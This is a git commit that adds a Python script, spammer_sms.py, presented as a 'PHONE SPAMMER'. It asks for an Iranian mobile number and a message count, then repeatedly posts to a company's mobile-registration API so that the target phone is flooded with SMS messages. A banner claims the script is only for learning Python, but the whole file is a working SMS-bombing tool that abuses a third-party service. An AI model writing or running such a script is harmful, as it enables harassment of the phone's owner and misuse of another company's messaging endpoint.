8bdc6ced53342d7d5144e58e49e7e9980ba451aa
kinguser20204 <67064781+kinguser20204@users.noreply.github.com>
2020-06-17 23:39:19 +0430

    Add files via upload

---
+++ spammer_sms.py
@@ -0,0 +1,48 @@
+import requests,random,json, colorama 
+from colorama import Fore
+
+a = """
+
+
+ _______  _______  _______  _______  _______  _______  _______ 
+ (  ____ \(  ____ )(  ___  )(       )(       )(  ____ \(  ____ )
+ | (    \/| (    )|| (   ) || () () || () () || (    \/| (    )|
+ | (_____ | (____)|| (___) || || || || || || || (__    | (____)|
+ (_____  )|  _____)|  ___  || |(_)| || |(_)| ||  __)   |     __)
+       ) || (      | (   ) || |   | || |   | || (      | (\ (   
+ /\____) || )      | )   ( || )   ( || )   ( || (____/\| ) \ \__
+ \_______)|/       |/     \||/     \||/     \|(_______/|/   \__/
+                                                                
+  PHONE SPAMMER BY ANAS V2
+  Edited BY @h@SsEiN
+  
+Please follow me in instagram :
+    
+👉 hossein.1171991
+  
+  
+  
+  
+  
+"""
+print (Fore.GREEN + a)
+
+
+print (Fore.RED + " Warning !!! this script just created for learning python3!!!")
+
+
+
+print (Fore.YELLOW + " before use please install modules requestes , colorama ,...")
+
+
+
+b = input(Fore.GREEN + "[*] Phone Number: 09")
+c = input("[*] Number of Spam: ")
+d = int(b)
+e = int(c)
+for f in range(e):
+    s = requests.post(url="https://isacoapp.isaco.ir/api/Account/RegisterMobileNumber?mobileNumber=09%s"%b, headers={'Content-Type':'application/json'})
+    if s.status_code == 200:
+    	 print(Fore.GREEN + " [+]  Sended PM  " ) 
+    else :
+     print(Fore.RED + " [+] failure! please check your conection Internet and try again")
